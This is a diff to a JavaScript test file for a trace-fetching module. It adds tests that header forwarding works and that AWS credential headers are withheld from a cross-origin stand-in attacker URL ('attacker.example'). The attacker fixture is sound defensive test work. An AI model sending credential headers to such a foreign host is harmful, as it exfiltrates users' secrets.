@@ -12,9 +12,13 @@ const { fetchTraces, parseTrace } = require("./trace_parser.js");
 
 // Minimal fetch() mock: maps a URL → bytes (Buffer/Uint8Array) and returns a
 // Response-like object exposing arrayBuffer(). Supports an error URL too.
+// Records the second (options) argument of each call so tests can assert that
+// headers are forwarded.
 function installFetchMock(urlToBytes) {
   const original = global.fetch;
-  global.fetch = async (url) => {
+  const calls = [];
+  global.fetch = async (url, opts) => {
+    calls.push({ url, opts });
     if (!(url in urlToBytes)) {
       return { ok: false, status: 404, async arrayBuffer() { return new ArrayBuffer(0); } };
     }
@@ -28,7 +32,9 @@ function installFetchMock(urlToBytes) {
       },
     };
   };
-  return () => { global.fetch = original; };
+  const restore = () => { global.fetch = original; };
+  restore.calls = calls;
+  return restore;
 }
 
 // Normalize to a plain Uint8Array so deepStrictEqual doesn't trip on the
@@ -104,6 +110,51 @@ async function main() {
       const buf = await fetchTraces(["/a", "/b", "/c"]);
       assert.deepStrictEqual(bytesOf(buf), new Uint8Array([1, 2, 3, 4, 5, 6]));
     } finally { restore(); }
+  });
+
+  // ── Test 5b: opts.headers are forwarded to every fetch (BYO credentials) ──
+  await testAsync("headers are forwarded to each fetch", async () => {
+    const restore = installFetchMock({ "/a": rawTrace, "/b": rawTrace });
+    try {
+      const headers = { "x-dial9-aws-access-key-id": "AKIA" };
+      await fetchTraces(["/a", "/b"], { headers });
+      assert.strictEqual(restore.calls.length, 2, "two fetches issued");
+      for (const call of restore.calls) {
+        assert.ok(call.opts, "fetch received an options arg");
+        assert.deepStrictEqual(call.opts.headers, headers, "headers forwarded");
+      }
+    } finally { restore(); }
+  });
+
+  // ── Test 5c: credential headers are withheld from cross-origin URLs ──
+  // A crafted `?trace=https://attacker/` must NOT receive the AWS credential
+  // headers, or it would exfiltrate the user's credentials to a foreign host.
+  await testAsync("credential headers are withheld from cross-origin URLs", async () => {
+    const restore = installFetchMock({
+      "/api/trace?keys=seg": rawTrace,
+      "https://attacker.example/x": rawTrace,
+    });
+    // Simulate a browser served from https://dial9.example.
+    const originalLocation = global.location;
+    global.location = { origin: "https://dial9.example", href: "https://dial9.example/viewer.html" };
+    try {
+      const headers = { "x-dial9-aws-access-key-id": "AKIA", "x-dial9-aws-secret-access-key": "shh" };
+      await fetchTraces(["/api/trace?keys=seg", "https://attacker.example/x"], { headers });
+      assert.strictEqual(restore.calls.length, 2, "two fetches issued");
+
+      const sameOrigin = restore.calls.find((c) => c.url === "/api/trace?keys=seg");
+      const crossOrigin = restore.calls.find((c) => c.url === "https://attacker.example/x");
+
+      assert.deepStrictEqual(sameOrigin.opts.headers, headers, "same-origin request keeps credentials");
+      assert.strictEqual(
+        crossOrigin.opts.headers,
+        undefined,
+        "cross-origin request must NOT carry credential headers"
+      );
+    } finally {
+      restore();
+      global.location = originalLocation;
+    }
   });
 
   // ── Test 5: a failed component rejects with an informative error ──
